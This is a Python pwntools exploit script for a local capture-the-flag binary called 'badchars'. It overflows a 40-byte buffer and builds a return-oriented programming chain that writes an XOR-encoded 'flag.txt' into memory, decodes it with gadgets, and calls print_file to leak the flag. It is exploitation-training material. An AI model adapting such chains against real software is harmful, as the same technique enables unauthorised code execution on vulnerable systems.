#/usr/bin/python3
from pwn import process, xor, p64, log

shell = process("./badchars")

offset = 40
junk = b"A" * offset

string = xor(b"flag.txt", 2)

bss = 0x601038

print_file = p64(0x400510)

pop_r12_r13_r14_r15 = p64(0x40069c)
mov_r13_r12 = p64(0x400634)
pop_r14_r15 = p64(0x4006a0)
xor_r15_r14 = p64(0x400628)
pop_rdi = p64(0x4006a3)
ret = p64(0x4004ee)

payload  = b""
payload += junk
payload += pop_r12_r13_r14_r15 + string + p64(bss) + p64(0) + p64(0)
payload += mov_r13_r12

for i in range(8):
    payload += pop_r14_r15 + p64(2) + p64(bss + i)
    payload += xor_r15_r14

payload += pop_rdi + p64(bss)
payload += ret
payload += print_file

shell.sendlineafter(b"> ", payload)

flag = shell.recvline_contains(b"ROPE").decode()
log.info(f"Flag: {flag}")
